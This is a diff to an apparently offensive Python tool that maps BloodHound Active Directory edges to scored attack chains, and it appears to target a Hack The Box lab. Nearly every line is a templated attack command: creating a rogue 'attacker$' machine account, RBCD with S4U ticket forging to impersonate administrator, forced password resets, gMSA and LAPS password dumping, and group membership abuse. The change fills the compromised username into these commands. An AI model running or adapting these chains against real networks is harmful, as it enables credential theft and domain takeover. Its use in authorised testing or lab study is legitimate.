@@ -743,21 +743,24 @@ def run(report, store, ui=None):
                 # bloodhound stores computers as FQDN (no '$' suffix).
                 computer = (edge.get("target_kind") == "computers"
                             or tgt.endswith("$"))
+                # iter-40: resolve principal for -u '<owned-user>' slot.
+                _owned = _pname if _pname else "<owned-user>"
                 if computer:
                     # Derive sam-style host name (no $/.fqdn) for RBCD CLI.
                     # 'WEB01.HTB.LOCAL' -> 'WEB01'; 'WEB01$' -> 'WEB01'.
                     host_short = tgt.split(".")[0].rstrip("$")
                     fqdn = tgt if "." in tgt else f"{host_short}.<dom>"
                     chains.append(Chain("R-RBCD", "RBCD via writeable AD object",
-                        f"{r} on computer {tgt} (RBCD -> S4U2self+U2U -> LocalSystem)",
+                        f"{r}: {actor} -> {tgt} "
+                        f"(RBCD -> S4U2self+U2U -> LocalSystem)",
                         crit=8, conf=0.7, ready=1.2, prox=0.85,     # score 5.71
                         commands=[
                             f"impacket-addcomputer -computer-name 'attacker$' "
                             f"-computer-pass 'P@ssw0rd!' -dc-host <DC> "
-                            f"'<dom>/<owned-user>:<password>'",
+                            f"'<dom>/{_owned}:<password>'",
                             f"impacket-rbcd -delegate-from 'attacker$' "
                             f"-delegate-to '{host_short}$' -action write "
-                            f"'<dom>/<owned-user>:<password>'",
+                            f"'<dom>/{_owned}:<password>'",
                             f"impacket-getST -spn 'cifs/{fqdn}' "
                             f"-impersonate administrator '<dom>/attacker$:P@ssw0rd!'",
                             f"export KRB5CCNAME=administrator.ccache; "
@@ -765,45 +768,49 @@ def run(report, store, ui=None):
                         ], src=edge["src"], line=edge["line"]))
                 else:
                     chains.append(Chain("R-WRITEDACL", "force-change-password via writeable user",
-                        f"{r} on user {tgt} (ForceChangePassword -> own as DA?)",
+                        f"{r}: {actor} -> {tgt} (ForceChangePassword -> own as DA?)",
                         crit=7, conf=0.7, ready=1.3, prox=0.85,     # score 5.42
                         commands=[
                             f"net rpc password '{tgt}' '<NewP@ss123!>' "
-                            f"-U '<dom>/<owned-user>%<password>' -S <DC>",
+                            f"-U '<dom>/{_owned}%<password>' -S <DC>",
                             f"netexec smb <DC> -u '{tgt}' -p '<NewP@ss123!>' --shares",
                         ], src=edge["src"], line=edge["line"]))
             elif r == "ForceChangePassword":
+                _owned = _pname if _pname else "<owned-user>"
                 chains.append(Chain("R-WRITEDACL", "ForceChangePassword",
-                    f"ForceChangePassword on {tgt}",
+                    f"ForceChangePassword: {actor} -> {tgt}",
                     crit=7, conf=0.8, ready=1.4, prox=0.85,         # score 6.66
                     commands=[
                         f"net rpc password '{tgt}' '<NewP@ss123!>' "
-                        f"-U '<dom>/<owned-user>%<password>' -S <DC>",
+                        f"-U '<dom>/{_owned}%<password>' -S <DC>",
                     ], src=edge["src"], line=edge["line"]))
             elif r == "ReadGMSAPassword":
+                _owned = _pname if _pname else "<owned-user>"
                 chains.append(Chain("R-GMSA-READ", "read gMSA password",
-                    f"ReadGMSAPassword on {tgt}",
+                    f"ReadGMSAPassword: {actor} -> {tgt}",
                     crit=8, conf=0.9, ready=1.5, prox=0.9,          # score 9.72
                     commands=[
-                        f"netexec ldap <DC> -u '<owned-user>' -p '<password>' --gmsa",
-                        f"# or: impacket-gMSADumper -u '<owned-user>' "
+                        f"netexec ldap <DC> -u '{_owned}' -p '<password>' --gmsa",
+                        f"# or: impacket-gMSADumper -u '{_owned}' "
                         f"-p '<password>' -d '<dom>' -l <DC>",
                     ], src=edge["src"], line=edge["line"]))
             elif r == "ReadLAPSPassword":
+                _owned = _pname if _pname else "<owned-user>"
                 chains.append(Chain("R-LAPS-READ", "read LAPS password",
-                    f"ReadLAPSPassword on {tgt}",
+                    f"ReadLAPSPassword: {actor} -> {tgt}",
                     crit=8, conf=0.9, ready=1.5, prox=0.9,          # score 9.72
                     commands=[
-                        f"netexec ldap <DC> -u '<owned-user>' -p '<password>' "
+                        f"netexec ldap <DC> -u '{_owned}' -p '<password>' "
                         f"--laps  # filter to {tgt}",
                     ], src=edge["src"], line=edge["line"]))
             elif r == "AddMember":
+                _owned = _pname if _pname else "<owned-user>"
                 chains.append(Chain("R-ADDMEMBER", "AD group add-member",
-                    f"AddMember on group {tgt}",
+                    f"AddMember: {actor} -> group {tgt}",
                     crit=6, conf=0.7, ready=1.3, prox=0.8,
                     commands=[
-                        f"impacket-net rpc group addmem '{tgt}' '<owned-user>' "
-                        f"-U '<dom>/<owned-user>%<password>' -S <DC>",
+                        f"impacket-net rpc group addmem '{tgt}' '{_owned}' "
+                        f"-U '<dom>/{_owned}%<password>' -S <DC>",
                     ], src=edge["src"], line=edge["line"]))
     # SAM/SYSTEM/SECURITY triad in one dir -> local secretsdump (no network).
     # iter-13: conf=1.0 was 'command will succeed', but conf encodes 'likelihood
